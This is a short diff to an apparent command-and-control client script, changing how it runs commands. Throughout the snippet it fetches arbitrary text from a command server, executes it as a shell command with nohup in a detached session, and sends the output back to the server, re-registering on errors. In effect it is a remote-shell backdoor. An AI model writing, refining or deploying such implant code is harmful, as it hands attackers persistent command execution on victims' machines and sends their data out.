@@ -48,10 +48,18 @@ def main():
                 continue
             
             # Spawn process to run shell command
-            result = subprocess.run(f"nohup {r.text} &", shell=True, capture_output=True, text=True, start_new_session=True, timeout=5)
+            process = subprocess.Popen(
+                f"nohup {r.text} &", 
+                shell=True, 
+                text=True, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE, 
+                start_new_session=True
+            )
+            stdout, stderr = process.communicate(timeout=5)
 
             # report results to command server
-            r = requests.get(f'{HOST}/api/{data["ip"]}/res', data=result.stdout + result.stderr)
+            r = requests.get(f'{HOST}/api/{data["ip"]}/res', data=stdout + stderr)
             if r.status_code == 500: # if request errors reregister
                 reg_loop(data)
         except requests.exceptions.Timeout: # on these errors
